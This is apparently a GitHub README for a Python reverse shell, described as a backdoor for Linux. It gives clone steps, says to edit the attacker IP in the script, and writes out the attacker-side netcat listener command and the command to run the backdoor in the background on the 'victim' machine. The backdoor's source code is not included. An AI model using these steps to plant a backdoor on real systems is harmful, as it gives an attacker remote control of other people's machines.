## ReverseShell | written in python3

- A python backdoor/reverseshell for linux.

![backd](https://raw.githubusercontent.com/Keyj33k/profiles/main/profile/backd_profile.jpeg)

## How to use?

Clone the repo:
```
git clone https://github.com/Keyj33k/ReverseShell.git
```

After successful cloning:
```
cd ReverseShell
```

Now you need to change the ip in the script!

After saving your custom backdoor you can test it:

- On the attacker machine:
```
nc -lnvp 5003
```
- On the vivtim machine:
```
python3 reverseshell.py &
```

